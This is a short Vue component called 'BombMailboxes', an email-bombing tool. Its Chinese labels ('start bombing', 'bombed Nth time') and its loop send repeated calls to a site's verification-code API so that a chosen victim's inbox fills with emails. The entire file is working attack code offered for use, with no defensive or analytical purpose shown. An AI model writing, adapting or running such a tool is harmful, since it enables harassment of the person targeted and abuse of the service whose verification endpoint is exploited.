<template>
  <div>
    <input v-model="email" placeholder="轰炸邮箱" type="text">
    <input v-model="times" placeholder="轰炸次数" type="text">
    <button @click="beginBomb">开始轰炸</button>
    <span>成功轰炸第{{ curTime }}次</span>
  </div>
</template>

<script>
export default {
  name: "BombMailboxes",
};
</script>
<script setup>
import { ref } from "vue";
import { getVerificationCode } from "@/api/login";

const email = ref("");
const times = ref("");
const curTime = ref(0);
const beginBomb = function() {
  for (let i = 0; i < times.value; i++) {
    getVerificationCode({ username: email.value }).then((response) => {
      if (response.code === 200) {
        curTime.value = i + 1;
      }
    });
  }
};
</script>

<style scoped>

</style>
